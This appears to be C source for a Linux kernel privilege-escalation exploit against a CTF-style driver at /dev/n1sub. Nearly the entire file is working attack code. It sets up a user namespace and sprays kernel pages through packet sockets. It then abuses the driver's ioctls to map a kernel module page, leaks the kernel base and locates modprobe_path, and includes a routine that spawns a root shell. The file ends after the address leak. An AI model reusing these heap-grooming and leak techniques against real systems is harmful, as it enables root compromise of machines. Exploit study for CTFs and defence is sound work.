#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define o(x) (kbase + x)

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};


/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM 200

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void)
{
    /**
     * We want a more clear and continuous memory there, which require us to 
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}

// raw_packet
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

size_t kbase;
char buf[0x1000];

#define CMD_ADD 0xdeadbee0
#define CMD_DEL 0xdeadbee1
#define CMD_SUB 0xdeadbee2
#define STEP    4

int g_fd = -1;
int busybox_fd = -1;

uint sub_add(unsigned int *arg) {
    size_t ret = 0;
    ret = ioctl(g_fd, CMD_ADD, arg);
    return ret;
}

void sub_del(int idx) { ioctl(g_fd, CMD_DEL, idx); }

void sub_sub(int idx) { ioctl(g_fd, CMD_SUB, idx); }

void sub_cnt(int idx, int cnt) {
    for (int i = 0; i < cnt; i++) {
        sub_sub(idx);
    }
}

#define PIPE_FD_MAX 100
int pipe_fds[PIPE_FD_MAX][2];

int main() {
    bind_cpu(0);

    g_fd = open("/dev/n1sub", O_RDWR);
    if (g_fd < 0) {
        die("open /dev/n1sub failed");
    }

    unshare_setup();
    // prepare_pgv_system();
    // prepare_pgv_pages();
	
    int sub_size, sub_offset;
    int ret;

    sub_size = sub_add(&sub_offset);
    logd("size: 0x%x", sub_size);
    logd("sub_offset: 0x%x", sub_offset);

	
	int block_nr = sub_size / 0x8;
	
	if (sub_size > 0x400 && sub_size < 0x800)
	{
		sub_size = sub_add(&sub_offset);
		sub_del(0);
		sub_del(1);
	}
	else
	{
		sub_del(0);
	}
	
	int packet_fds = pagealloc_pad(block_nr, PAGE_SIZE);
	
	logd("Searching for module page...");
	
	uint64_t *evil_block;
	
	for (int k = 0; ; k++)
	{
		sub_cnt(0, PAGE_SIZE);
		
		char *page = mmap(NULL, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0);
		
		if ((uint64_t)page == -1) continue;
		
		evil_block = (void *)((sub_offset / 0x8) * PAGE_SIZE + page);
		
		if (evil_block[0x3] == 0x0000000000627573)
		{
			logi("Got module page vmmap");
			break;
		}
		
		munmap(page, PAGE_SIZE * block_nr);
		
		if (k > 0x200)
		{
			die("Search for module page Failure");
		}
		
	}
	
	kbase = evil_block[0xF] - 0x1851720;
	uint64_t modprobe_path = o(0x1852420);
	
	logd("kernel_base = 0x%lx", kbase);
	logd("modprobe_path = 0x%lx", modprobe_path);
}
